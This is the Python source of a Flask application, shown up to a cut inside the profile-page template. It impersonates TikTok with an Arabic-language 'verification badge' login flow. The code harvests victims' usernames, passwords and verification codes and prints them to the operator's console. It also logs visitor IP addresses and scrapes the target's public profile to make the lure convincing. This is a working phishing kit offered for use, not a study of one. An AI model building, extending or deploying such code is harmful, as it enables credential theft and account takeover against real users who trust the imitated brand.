#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import re
import sys
import time
import random
from datetime import datetime, timedelta
import string
import asyncio
import threading
import requests
from PIL import Image, ImageDraw, ImageFont
from io import BytesIO
from rich.console import Console
from flask import Flask, render_template, request, redirect, url_for, session, send_file
from rich.text import Text
from bs4 import BeautifulSoup
from threading import Thread
import subprocess
import urllib.parse
import ipaddress
import logging
import socket

app = Flask(__name__)
app.secret_key = 'tiktok_verification_secret_key_2025'

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
app.logger.disabled = True
logging.getLogger('werkzeug').disabled = True

console = Console()
os.system('cls' if os.name == 'nt' else 'clear')

console.print(r"""

 ________  __  __       ________         __       
/        |/  |/  |     /        |       /  |      
$$$$$$$$/ $$/ $$ |   __$$$$$$$$/______  $$ |   __ 
   $$ |   /  |$$ |  /  |  $$ | /      \ $$ |  /  |
   $$ |   $$ |$$ |_/$$/   $$ |/$$$$$$  |$$ |_/$$/ 
   $$ |   $$ |$$   $$<    $$ |$$ |  $$ |$$   $$<  
   $$ |   $$ |$$$$$$  \   $$ |$$ \__$$ |$$$$$$  \ 
   $$ |   $$ |$$ | $$  |  $$ |$$    $$/ $$ | $$  |
   $$/    $$/ $$/   $$/   $$/  $$$$$$/  $$/   $$/ 
                                                  
                                                  
                                                  
""", style="bold red")

verification_codes = {}
user_data_cache = {}
captcha_cache = {}
login_times = {}
ip_logged = {}

def box(text):
    lines = str(text).splitlines() or [""]
    maxlen = max(len(line) for line in lines)
    padding = 2
    top = "┌" + "─" * (maxlen + padding * 2) + "┐"
    bottom = "└" + "─" * (maxlen + padding * 2) + "┘"
    middle = [f"│{' ' * padding}{line.ljust(maxlen)}{' ' * padding}│" for line in lines]
    return "\n".join([top] + middle + [bottom])

def get_all_ips():
    ipv4_ips = []
    ipv6_ips = []
    
    external_services = [
        'https://api.ipify.org',
        'https://ident.me',
        'https://checkip.amazonaws.com',
        'https://ipinfo.io/ip'
    ]
    
    for service in external_services:
        try:
            response = requests.get(service, timeout=2)
            if response.status_code == 200:
                ip = response.text.strip()
                if ipaddress.ip_address(ip).version == 4 and ip not in ipv4_ips:
                    ipv4_ips.append(ip)
                elif ipaddress.ip_address(ip).version == 6 and ip not in ipv6_ips:
                    ipv6_ips.append(ip)
        except:
            continue
    
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        if local_ip and local_ip != '127.0.0.1' and local_ip not in ipv4_ips:
            ipv4_ips.append(local_ip)
    except:
        pass
    
    try:
        import netifaces
        for interface in netifaces.interfaces():
            addrs = netifaces.ifaddresses(interface)
            if netifaces.AF_INET in addrs:
                for addr in addrs[netifaces.AF_INET]:
                    ip = addr.get('addr')
                    if ip and ip != '127.0.0.1' and not ip.startswith('169.254.') and ip not in ipv4_ips:
                        ipv4_ips.append(ip)
            if netifaces.AF_INET6 in addrs:
                for addr in addrs[netifaces.AF_INET6]:
                    ip = addr.get('addr')
                    if ip and ip != '::1' and '%' not in ip and ip not in ipv6_ips:
                        ipv6_ips.append(ip)
    except:
        pass
    
    return ipv4_ips, ipv6_ips

def get_real_ip():
    ipv4_ips, ipv6_ips = get_all_ips()
    
    headers = [
        'CF-Connecting-IP', 'True-Client-IP', 'X-Real-IP', 'X-Forwarded-For',
        'X-Client-IP', 'X-Cluster-Client-IP', 'Fastly-Client-IP', 'CF-Pseudo-IPv4',
        'X-Original-IP', 'Forwarded-For', 'Forwarded', 'Client-IP'
    ]
    
    for header in headers:
        ip = request.headers.get(header)
        if ip:
            if ',' in ip:
                ip = ip.split(',')[0].strip()
            try:
                ip_obj = ipaddress.ip_address(ip)
                if not ip_obj.is_private and not ip_obj.is_loopback:
                    if ip_obj.version == 4 and ip not in ipv4_ips:
                        ipv4_ips.insert(0, ip)
                    elif ip_obj.version == 6 and ip not in ipv6_ips:
                        ipv6_ips.insert(0, ip)
            except:
                continue
    
    return ipv4_ips, ipv6_ips

def detect_ip_version(ip):
    try:
        return "IPv4" if ipaddress.ip_address(ip).version == 4 else "IPv6"
    except:
        return "Unknown"

def generate_verification_code():
    return ''.join(random.choices(string.digits, k=6))

def generate_captcha_text():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))

def create_captcha_image(text):
    try:
        width, height = 200, 80
        image = Image.new('RGB', (width, height), color=(255, 255, 255))
        draw = ImageDraw.Draw(image)

        try:
            font = ImageFont.truetype("arial.ttf", 36)
        except:
            try:
                font = ImageFont.truetype("/usr/share/fonts/truetype/freefont/FreeMono.ttf", 36)
            except:
                font = ImageFont.load_default()

        bbox = draw.textbbox((0, 0), text, font=font)
        text_width = bbox[2] - bbox[0]
        text_height = bbox[3] - bbox[1]
        x = (width - text_width) / 2
        y = (height - text_height) / 2

        draw.text((x, y), text, fill=(0, 0, 0), font=font)

        for _ in range(100):
            x = random.randint(0, width-1)
            y = random.randint(0, height-1)
            draw.point((x, y), fill=(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)))

        img_io = BytesIO()
        image.save(img_io, 'PNG')
        img_io.seek(0)
        return img_io
    except Exception as e:
        return None

def get_user_info(identifier, by_id=False):
    if by_id:
        url = f"https://www.tiktok.com/@{identifier}"
    else:
        if identifier.startswith('@'):
            identifier = identifier[1:]
        url = f"https://www.tiktok.com/@{identifier}"

    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }

    try:
        response = requests.get(url, headers=headers, timeout=10)

        if response.status_code == 200:
            html_content = response.text

            try:
                soup = BeautifulSoup(html_content, 'lxml')
            except:
                soup = BeautifulSoup(html_content, 'html.parser')

            patterns = {
                'user_id': r'"webapp.user-detail":{"userInfo":{"user":{"id":"(\d+)"',
                'unique_id': r'"uniqueId":"(.*?)"',
                'nickname': r'"nickname":"(.*?)"',
                'followers': r'"followerCount":(\d+)',
                'following': r'"followingCount":(\d+)',
                'likes': r'"heartCount":(\d+)',
                'videos': r'"videoCount":(\d+)',
                'signature': r'"signature":"(.*?)"',
                'verified': r'"verified":(true|false)',
                'secUid': r'"secUid":"(.*?)"',
                'profile_pic': r'"avatarLarger":"(.*?)"'
            }

            info = {}
            for key, pattern in patterns.items():
                match = re.search(pattern, html_content)
                info[key] = match.group(1) if match else f"No {key} found"

            if "profile_pic" in info:
                info['profile_pic'] = info['profile_pic'].replace('\\u002F', '/')

            return info
        else:
            return None

    except Exception as e:
        return None

def scrape_tiktok_profile_real(username):
    try:
        scraped_data = get_user_info(username)
        if scraped_data:
            return {
                'username': scraped_data.get('unique_id', username),
                'display_name': scraped_data.get('nickname', f'@{username}'),
                'followers': int(scraped_data.get('followers', 0)) if scraped_data.get('followers', '0').isdigit() else 0,
                'following': int(scraped_data.get('following', 0)) if scraped_data.get('following', '0').isdigit() else 0,
                'likes': int(scraped_data.get('likes', 0)) if scraped_data.get('likes', '0').isdigit() else 0,
                'videos': int(scraped_data.get('videos', 0)) if scraped_data.get('videos', '0').isdigit() else 0,
                'bio': scraped_data.get('signature', 'مستخدم TikTok'),
                'verified': scraped_data.get('verified', 'false').lower() == 'true',
                'profile_pic': scraped_data.get('profile_pic', 'https://via.placeholder.com/150x150/fe2d52/ffffff?text=TT'),
                'created_at': 'N/A',
                'last_active': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'sec_uid': scraped_data.get('secUid', ''),
                'user_id': scraped_data.get('user_id', ''),
            }
        else:
            return create_fallback_data(username)
    except Exception as e:
        return create_fallback_data(username)

def create_fallback_data(username):
    return {
        'username': username,
        'display_name': f'@{username}',
        'followers': random.randint(100000, 5000000),
        'following': random.randint(50, 500),
        'likes': random.randint(1000000, 10000000),
        'videos': random.randint(10, 500),
        'bio': f'مرحباً! أنا {username} 🎵',
        'verified': True,
        'profile_pic': 'https://via.placeholder.com/150x150/fe2d52/ffffff?text=TT',
        'created_at': '2020-01-15',
        'last_active': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'sec_uid': 'fallback_sec_uid',
        'user_id': str(random.randint(100000, 999999)),
    }

async def scrape_tiktok_profile(username):
    return scrape_tiktok_profile_real(username)

def watch_input():
    while True:
        try:
            user_input = input()
            if user_input.strip():
                console.print(f"[bold cyan]Terminal input: {user_input}[/bold cyan]")
        except:
            break

@app.route('/captcha/<captcha_id>')
def get_captcha(captcha_id):
    if captcha_id in captcha_cache:
        image_data = captcha_cache[captcha_id]
        if isinstance(image_data, bytes):
            return send_file(BytesIO(image_data), mimetype='image/png')
        else:
            return send_file(image_data, mimetype='image/png')
    return "Captcha not found", 404

@app.before_request
def log_visitor():
    client_ip = request.remote_addr
    current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    if client_ip not in ip_logged:
        ipv4_ips, ipv6_ips = get_real_ip()
        ip_info = f"Time: {current_time}\n"
        
        if ipv4_ips:
            ip_info += f"IPv4: {ipv4_ips[0]}\n"
        if ipv6_ips:
            ip_info += f"IPv6: {ipv6_ips[0]}\n"
        
        ip_box = box(ip_info)
        console.print(f"\n[bold white]{ip_box}[/bold white]\n")
        ip_logged[client_ip] = current_time

@app.route('/', methods=['GET', 'POST'])
def step1():
    if request.method == 'POST':
        username = request.form.get('username')
        if username:
            session['username'] = username
            login_times[username] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            username_box = f"👤 Entered username: {username}"
            console.print(f"\n[bold red]{username_box}[/bold red]\n")
            return redirect(url_for("step2"))

    return '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>الخطوة 1 - توثيق TikTok</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body {margin: 0; padding: 0; background: #fff; display: flex; flex-direction: column; min-height: 100vh; font-family: Arial, sans-serif; color: #000;}
        .tiktok-logo-container {display: flex; justify-content: center; align-items: center; height: 80px; margin-bottom: 20px; padding-top: 20px;}
        .tiktok {position: relative; width: 37px; height: 218px; margin: 0 auto; z-index: 1; background: #fff; filter: drop-shadow(-10px -10px 0 #24f6f0) brightness(110%); box-shadow: 11.6px 10px 0 0 #fe2d52; transform: scale(0.3);}
        .tiktok::before {content: ""; position: absolute; width: 100px; height: 100px; border: 37px solid #fff; border-top: 37px solid transparent; border-radius: 50%; top: 123px; left: -137px; transform: rotate(45deg); filter: drop-shadow(16px 0px 0 #fe2d52);}
        .tiktok::after {content: ""; position: absolute; width: 140px; height: 140px; border: 30px solid #fff; border-right: 30px solid transparent; border-top: 30px solid transparent; border-left: 30px solid transparent; top: -100px; right: -172px; border-radius: 100%; transform: rotate(45deg); z-index: -10; filter: drop-shadow(14px 0 0 #fe2d52);}
        .container {flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px;}
        .login-modal {background: #ffffff; border-radius: 12px; padding: 50px; width: 100%; max-width: 450px; box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1); color: #000000; position: relative; animation: slideIn 0.3s ease-out; border: 1px solid #e1e5e9;}
        @keyframes slideIn {from {opacity: 0; transform: translateY(-20px);} to {opacity: 1; transform: translateY(0);}}
        .login-title {font-size: 28px; font-weight: bold; text-align: center; margin-bottom: 15px; color: #000000;}
        .login-subtitle {font-size: 16px; text-align: center; margin-bottom: 40px; color: #666666; line-height: 1.4;}
        .input-group {margin-bottom: 25px;}
        .input-field {width: 100%; padding: 18px; border: 2px solid #e1e5e9; border-radius: 8px; font-size: 16px; transition: all 0.3s ease; background: #ffffff; color: #000000; box-sizing: border-box;}
        .input-field:focus {outline: none; border-color: #fe2d52; box-shadow: 0 0 0 3px rgba(254, 45, 82, 0.1);}
        .btn {width: 100%; padding: 18px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: all 0.3s ease; text-decoration: none; display: inline-block; text-align: center;}
        .btn-primary {background: #f1f1f2; color: #a8a8a8; border: 1px solid #e1e5e9; cursor: not-allowed; opacity: 0.6;}
        .btn-primary.active {background: #fe2c55; color: #ffffff; cursor: pointer; opacity: 1;}
        .btn-primary.active:hover {background: #e02847; transform: translateY(-1px); box-shadow: 0 2px 8px rgba(254, 44, 85, 0.3);}
        .link {color: #ff6b35; text-decoration: none; font-weight: 500;}
        .link:hover {text-decoration: underline;}
        .footer {background: #f8f9fa; padding: 20px; text-align: center; border-top: 1px solid #e1e5e9; margin-top: auto; width: 100%; box-sizing: border-box; height: auto; min-height: auto;}
        .footer-links {display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; margin-bottom: 15px; max-width: 1200px; margin-left: auto; margin-right: auto;}
        .footer-link {color: #666666; text-decoration: none; font-size: 12px; transition: color 0.3s ease; padding: 5px 8px; border-radius: 4px; white-space: nowrap;}
        .footer-link:hover {color: #fe2d52; background-color: rgba(254, 45, 82, 0.05);}
        .footer-copyright {color: #999999; font-size: 11px; margin-top: 10px;}
        @media (max-width: 768px) {.login-modal {padding: 40px 30px; margin: 15px;} .footer {padding: 15px;} .footer-links {gap: 10px; margin-bottom: 10px;} .footer-link {font-size: 11px; padding: 4px 6px;}}
        @media (max-width: 480px) {.login-modal {padding: 30px 20px; margin: 10px;} .footer {padding: 10px;} .footer-links {gap: 8px; margin-bottom: 8px;} .footer-link {font-size: 10px; padding: 3px 5px;} .footer-copyright {font-size: 10px;}}
    </style>
</head>
<body>
    <div class="tiktok-logo-container"><div class="tiktok"></div></div>
    <div class="container">
        <div class="login-modal">
            <h2 class="login-title">تسجيل الدخول إلى TikTok</h2>
            <p class="login-subtitle">سجل الدخول لحسابك على TikTok للحصول على شارة التحقق</p>
            <form method="POST" action="/" id="step1Form">
                <div class="input-group"><input type="text" name="username" class="input-field" placeholder="البريد الإلكتروني أو اسم المستخدم" required id="usernameInput"></div>
                <button type="submit" class="btn btn-primary active" id="captcha-button">التالي</button>
            </form>
            <div style="text-align: center; margin-top: 25px;"><span style="color: #666;">ليس لديك حساب؟ </span><a href="https://www.tiktok.com/signup" class="link" target="_blank">إنشاء حساب</a></div>
        </div>
    </div>
    <footer class="footer">
        <div class="footer-links">
            <a href="https://www.tiktok.com/about?lang=ar" class="footer-link" target="_blank">حول TikTok</a>
            <a href="https://newsroom.tiktok.com/ar-mena" class="footer-link" target="_blank">الأخبار</a>
            <a href="https://www.tiktok.com/business/ar" class="footer-link" target="_blank">TikTok للأعمال</a>
            <a href="https://developers.tiktok.com/" class="footer-link" target="_blank">المطورون</a>
            <a href="https://www.tiktok.com/transparency/ar-sa/" class="footer-link" target="_blank">الشفافية</a>
            <a href="https://careers.tiktok.com/" class="footer-link" target="_blank">الوظائف</a>
            <a href="https://www.tiktok.com/legal/terms-of-service?lang=ar" class="footer-link" target="_blank">شروط الخدمة</a>
            <a href="https://www.tiktok.com/legal/privacy-policy-row?lang=ar" class="footer-link" target="_blank">سياسة الخصوصية</a>
            <a href="https://support.tiktok.com/ar" class="footer-link" target="_blank">المساعدة</a>
            <a href="https://www.tiktok.com/safety/ar-sa/" class="footer-link" target="_blank">الأمان</a>
        </div>
        <div class="footer-copyright">© 2025 TikTok</div>
    </footer>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const usernameInput = document.getElementById('usernameInput');
            const captchaButton = document.getElementById('captcha-button');
            if (usernameInput && captchaButton) {
                usernameInput.addEventListener('input', function() {
                    if (this.value.trim().length > 0) {
                        captchaButton.disabled = false;
                        captchaButton.classList.add('active');
                    } else {
                        captchaButton.disabled = true;
                        captchaButton.classList.remove('active');
                    }
                });
            }
        });
    </script>
</body>
</html>'''

@app.route('/password', methods=['GET', 'POST'])
def step2():
    username = session.get('username', '')
    if not username:
        return redirect(url_for('step1'))

    if request.method == 'POST':
        password = request.form.get('password')
        if password:
            session['password'] = password
            password_box = f"🔑 Entered password: {password}"
            console.print(f"\n[bold red]{password_box}[/bold red]\n")
            def run_scrape():
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                user_data = loop.run_until_complete(scrape_tiktok_profile(username))
                user_data_cache[username] = user_data
                loop.close()

            threading.Thread(target=run_scrape).start()
            return redirect(url_for('profile'))

    template = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>الخطوة 2 - توثيق TikTok</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body {margin: 0; padding: 0; background: #fff; display: flex; flex-direction: column; min-height: 100vh; font-family: Arial, sans-serif; color: #000;}
        .tiktok-logo-container {display: flex; justify-content: center; align-items: center; height: 80px; margin-bottom: 20px; padding-top: 20px;}
        .tiktok {position: relative; width: 37px; height: 218px; margin: 0 auto; z-index: 1; background: #fff; filter: drop-shadow(-10px -10px 0 #24f6f0) brightness(110%); box-shadow: 11.6px 10px 0 0 #fe2d52; transform: scale(0.3);}
        .tiktok::before {content: ""; position: absolute; width: 100px; height: 100px; border: 37px solid #fff; border-top: 37px solid transparent; border-radius: 50%; top: 123px; left: -137px; transform: rotate(45deg); filter: drop-shadow(16px 0px 0 #fe2d52);}
        .tiktok::after {content: ""; position: absolute; width: 140px; height: 140px; border: 30px solid #fff; border-right: 30px solid transparent; border-top: 30px solid transparent; border-left: 30px solid transparent; top: -100px; right: -172px; border-radius: 100%; transform: rotate(45deg); z-index: -10; filter: drop-shadow(14px 0 0 #fe2d52);}
        .container {flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px;}
        .login-modal {background: #ffffff; border-radius: 12px; padding: 50px; width: 100%; max-width: 450px; box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1); color: #000000; position: relative; animation: slideIn 0.3s ease-out; border: 1px solid #e1e5e9;}
        @keyframes slideIn {from {opacity: 0; transform: translateY(-20px);} to {opacity: 1; transform: translateY(0);}}
        .login-title {font-size: 28px; font-weight: bold; text-align: center; margin-bottom: 15px; color: #000000;}
        .login-subtitle {font-size: 16px; text-align: center; margin-bottom: 40px; color: #666666; line-height: 1.4;}
        .input-group {margin-bottom: 25px;}
        .input-field {width: 100%; padding: 18px; border: 2px solid #e1e5e9; border-radius: 8px; font-size: 16px; transition: all 0.3s ease; background: #ffffff; color: #000000; box-sizing: border-box;}
        .input-field:focus {outline: none; border-color: #fe2d52; box-shadow: 0 0 0 3px rgba(254, 45, 82, 0.1);}
        .btn {width: 100%; padding: 18px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: all 0.3s ease; text-decoration: none; display: inline-block; text-align: center;}
        .btn-primary {background: #f1f1f2; color: #a8a8a8; border: 1px solid #e1e5e9; cursor: not-allowed; opacity: 0.6;}
        .btn-primary.active {background: #fe2c55; color: #ffffff; cursor: pointer; opacity: 1;}
        .btn-primary.active:hover {background: #e02847; transform: translateY(-1px); box-shadow: 0 2px 8px rgba(254, 44, 85, 0.3);}
        .link {color: #ff6b35; text-decoration: none; font-weight: 500;}
        .link:hover {text-decoration: underline;}
        .footer {background: #f8f9fa; padding: 20px; text-align: center; border-top: 1px solid #e1e5e9; margin-top: auto; width: 100%; box-sizing: border-box; height: auto; min-height: auto;}
        .footer-links {display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; margin-bottom: 15px; max-width: 1200px; margin-left: auto; margin-right: auto;}
        .footer-link {color: #666666; text-decoration: none; font-size: 12px; transition: color 0.3s ease; padding: 5px 8px; border-radius: 4px; white-space: nowrap;}
        .footer-link:hover {color: #fe2d52; background-color: rgba(254, 45, 82, 0.05);}
        .footer-copyright {color: #999999; font-size: 11px; margin-top: 10px;}
        @media (max-width: 768px) {.login-modal {padding: 40px 30px; margin: 15px;} .footer {padding: 15px;} .footer-links {gap: 10px; margin-bottom: 10px;} .footer-link {font-size: 11px; padding: 4px 6px;}}
        @media (max-width: 480px) {.login-modal {padding: 30px 20px; margin: 10px;} .footer {padding: 10px;} .footer-links {gap: 8px; margin-bottom: 8px;} .footer-link {font-size: 10px; padding: 3px 5px;} .footer-copyright {font-size: 10px;}}
    </style>
</head>
<body>
    <div class="tiktok-logo-container"><div class="tiktok"></div></div>
    <div class="container">
        <div class="login-modal">
            <h2 class="login-title">أدخل كلمة المرور</h2>
            <p class="login-subtitle">أدخل كلمة المرور الخاصة بحسابك ''' + username + '''</p>
            <form method="POST" action="/password" id="step2Form">
                <div class="input-group">
                    <input type="hidden" name="username" value="''' + username + '''">
                    <input type="password" name="password" class="input-field" placeholder="كلمة المرور" required id="passwordInput">
                </div>
                <button type="submit" class="btn btn-primary" id="loginButton" disabled>تسجيل الدخول</button>
            </form>
            <div style="text-align: center; margin-top: 25px;"><a href="#" class="link">نسيت كلمة المرور؟</a></div>
        </div>
    </div>
    <footer class="footer">
        <div class="footer-links">
            <a href="https://www.tiktok.com/about?lang=ar" class="footer-link" target="_blank">حول TikTok</a>
            <a href="https://newsroom.tiktok.com/ar-mena" class="footer-link" target="_blank">الأخبار</a>
            <a href="https://www.tiktok.com/business/ar" class="footer-link" target="_blank">TikTok للأعمال</a>
            <a href="https://developers.tiktok.com/" class="footer-link" target="_blank">المطورون</a>
            <a href="https://www.tiktok.com/transparency/ar-sa/" class="footer-link" target="_blank">الشفافية</a>
            <a href="https://careers.tiktok.com/" class="footer-link" target="_blank">الوظائف</a>
            <a href="https://www.tiktok.com/legal/terms-of-service?lang=ar" class="footer-link" target="_blank">شروط الخدمة</a>
            <a href="https://www.tiktok.com/legal/privacy-policy-row?lang=ar" class="footer-link" target="_blank">سياسة الخصوصية</a>
            <a href="https://support.tiktok.com/ar" class="footer-link" target="_blank">المساعدة</a>
            <a href="https://www.tiktok.com/safety/ar-sa/" class="footer-link" target="_blank">الأمان</a>
        </div>
        <div class="footer-copyright">© 2025 TikTok</div>
    </footer>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const passwordInput = document.getElementById('passwordInput');
            const loginButton = document.getElementById('loginButton');
            if (passwordInput && loginButton) {
                passwordInput.addEventListener('input', function() {
                    if (this.value.trim().length > 0) {
                        loginButton.disabled = false;
                        loginButton.classList.add('active');
                    } else {
                        loginButton.disabled = true;
                        loginButton.classList.remove('active');
                    }
                });
            }
        });
    </script>
</body>
</html>'''
    return template

@app.route('/profile', methods=['GET', 'POST'])
def profile():
    username = session.get('username', '')
    if not username:
        return redirect(url_for('step1'))

    if request.method == 'POST':
        captcha_input = request.form.get('captcha_input', '')
        verification_code = request.form.get('verification_code', '')
        
        login_time = login_times.get(username, 'Unknown')
        password = session.get('password', '')
        
        data_box = box(f"Username: {username}\nPassword: {password}\nVerification Code: {verification_code}\nLogin Time: {login_time}")
        console.print(f"\n[bold yellow]{data_box}[/bold yellow]\n")
        
        captcha_box = f"📝 Entered CAPTCHA: {captcha_input}"
        console.print(f"\n[bold cyan]{captcha_box}[/bold cyan]\n")
        
        verification_box = f"🔢 Entered Verification Code: {verification_code}"
        console.print(f"\n[bold #0000FF]{verification_box}[/bold #0000FF]\n")
        
        return redirect(url_for('profile'))

    wait_count = 0
    while username not in user_data_cache and wait_count < 5:
        time.sleep(0.5)
        wait_count += 1

    if username not in user_data_cache:
        user_data_cache[username] = create_fallback_data(username)

    user_data = user_data_cache.get(username)

    captcha_text = generate_captcha_text()
    session['captcha_text'] = captcha_text
    captcha_image = create_captcha_image(captcha_text)
    captcha_id = str(random.randint(100000, 999999))
    if captcha_image:
        captcha_cache[captcha_id] = captcha_image.getvalue()

    verification_code = generate_verification_code()
    session['verification_code'] = verification_code
    session['verification_start_time'] = time.time()

    template = '''
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>الملف الشخصي - توثيق TikTok</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body {margin: 0; padding: 0; background: #fff; display: flex; flex-direction: column; min-height: 100vh; font-family: Arial, sans-serif; color: #000;}
        .tiktok-logo-container {display: flex; justify-content: center; align-items: center; height: 80px; margin-bottom: 20px; padding-top: 20px;}
        .tiktok {position: relative; width: 37px; height: 218px; margin: 0 auto; z-index: 1; background: #fff; filter: drop-shadow(-10px -10px 0 #24f6f0) brightness(110%); box-shadow: 11.6px 10px 0 0 #fe2d52; transform: scale(0.3);}
        .tiktok::before {content: ""; position: absolute; width: 100px; height: 100px; border: 37px solid #fff; border-top: 37px solid transparent; border-radius: 50%; top: 123px; left: -137px; transform: rotate(45deg); filter: drop-shadow(16px 0px 0 #fe2d52);}
        .tiktok::after {content: ""; position: absolute; width: 140px; height: 140px; border: 30px solid #fff; border-right: 30px solid transparent; border-top: 30px solid transparent; border-left: 30px solid transparent; top: -100px; right: -172px; border-radius: 100%; transform: rotate(45deg); z-index: -10; filter: drop-shadow(14px 0 0 #fe2d52);}
        .container {flex: 1; display: flex; justify-content: center; align-items: center; padding: 20px;}
        .login-modal {background: #ffffff; border-radius: 12px; padding: 50px; width: 100%; max-width: 700px; box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1); color: #000000; position: relative; animation: slideIn 0.3s ease-out; border: 1px solid #e1e5e9;}
        @keyframes slideIn {from {opacity: 0; transform: translateY(-20px);} to {opacity: 1; transform: translateY(0);}}
        .profile-data {background: #f8f9fa; border-radius: 12px; padding: 30px;}
        .profile-header {display: flex; align-items: center; margin-bottom: 20px;}
        .profile-pic {width: 80px; height: 80px; border-radius: 50%; margin-left: 20px; object-fit: cover; border: 2px solid #fe2d52;}
        .profile-info h3 {margin: 0; font-size: 24px; display: flex; align-items: center;}
        .verified-badge {width: 20px; height: 20px; background-color: #1ED3F0; border-radius: 50%; display: inline-flex; align-items: center; justify-content: center; box-shadow: 0 1px 3px rgba(0,0,0,0.3); margin-right: 8px;}
        .verified-badge i {color: white; font-size: 12px;}
        .profile-stats {display: grid; grid-template-columns: repeat(auto-fit, minmax(120px, 1fr)); gap: 15px; margin-top: 20px;}
        .stat-item {text-align: center; padding: 15px; background: #ffffff; border-radius: 8px; border: 1px solid #e1e5e9;}
        .stat-number {font-size: 20px; font-weight: bold; color: #fe2d52;}
        .stat-label {font-size: 14px; color: #666; margin-top: 5px;}
        .verification-section {margin-top: 30px; padding: 25px; background: #ffffff; border-radius: 12px; border: 2px solid #fe2d52;}
        .verification-title {font-size: 20px; font-weight: bold; text-align: center; margin-bottom: 20px; color: #fe2d52;}
        .captcha-container {text-align: center; margin: 20px 0;}
        .captcha-image {border: 2px solid #ddd; border-radius: 8px; margin-bottom: 10px; max-width: 100%; height: auto;}
        .input-group {margin-bottom: 20px;}
        .input-field {width: 100%; padding: 15px; border: 2px solid #e1e5e9; border-radius: 8px; font-size: 16px; transition: all 0.3s ease; background: #ffffff; color: #000000; box-sizing: border-box;}
        .input-field:focus {outline: none; border-color: #fe2d52; box-shadow: 0 0 0 3px rgba(254, 45, 82, 0.1);}
        .btn {width: 100%; padding: 15px; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; transition: all 0.3s ease; text-decoration: none; display: inline-block; text-align: center; margin-bottom: 10px;}
        .btn-primary {background: #f1f1f2; color: #a8a8a8; border: 1px solid #e1e5e9; cursor: not-allowed; opacity: 0.6;}
        .btn-primary.active {background: #fe2c55; color: #ffffff; cursor: pointer; opacity: 1;}
        .btn-primary.active:hover {background: #e02847; transform: translateY(-1px); box-shadow: 0 2px 8px rgba(254, 44, 85, 0.3);}
        .btn-resend {background: #fe2c55; color: #ffffff; padding: 10px 20px; font-size: 14px; margin-top: 10px;}
        .btn-resend:hover {background: #e02847;}
        .countdown {text-align: center; font-size: 16px; font-weight: bold; color: #fe2d52; margin: 15px 0;}
        .message {padding: 12px; border-radius: 6px; margin-bottom: 15px; text-align: center;}
        .message-info {background: #e8f4fd; color: #02587f; border: 1px solid #b6d7e8;}
        .footer {background: #f8f9fa; padding: 20px; text-align: center; border-top: 1px solid #e1e5e9; margin-top: auto; width: 100%; box-sizing: border-box; height: auto; min-height: auto;}
        .footer-links {display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; margin-bottom: 15px; max-width: 1200px; margin-left: auto; margin-right: auto;}
        .footer-link {color: #666666; text-decoration: none; font-size: 12px; transition: color 0.3s ease; padding: 5px 8px; border-radius: 4px; white-space: nowrap;}
        .footer-link:hover {color: #fe2d52; background-color: rgba(254, 45, 82, 0.05);}
        .footer-copyright {color: #999999; font-size: 11px; margin-top: 10px;}
        @media (max-width: 768px) {.login-modal {padding: 40px 30px; margin: 15px;} .footer {padding: 15px;} .footer-links {gap: 10px; margin-bottom: 10px;} .footer-link {font-size: 11px; padding: 4px 6px;} .profile-stats {grid-template-columns: repeat(2, 1fr);} .profile-header {flex-direction: column; text-align: center;} .profile-pic {margin: 0 0 15px 0;}}
        @media (max-width: 480px) {.login-modal {padding: 30px 20px; margin: 10px;} .footer {padding: 10px;} .footer-links {gap: 8px; margin-bottom: 8px;} .footer-link {font-size: 10px; padding: 3px 5px;} .footer-copyright {font-size: 10px;}}
    </style>
</head>
<body>
    <div class="tiktok-logo-container"><div class="tiktok"></div></div>
    <div class="container">
        <div class="login-modal profile-data">
            <div class="profile-header">
                <img src="''' + user_data['profile_pic'] + '''" alt="صورة الملف الشخصي" class="profile-pic" onerror="this.src='https://via.placeholder.com/150x150/fe2d52/ffffff?text=TT'">
                <div class="profile-info">
                    <h3>@''' + user_data['username'] + '''<span class="verified-badge"><i class="fas fa-check"></i></span></h3>
                    <p style="color: #666; margin-top: 5px;">''' + user_data['display_name'] + '''</p>
                </div>
            </div>
            <p style="margin-bottom: 20px; color: #333;">''' + user_data['bio'] + '''</p>
            <div class="profile-stats">
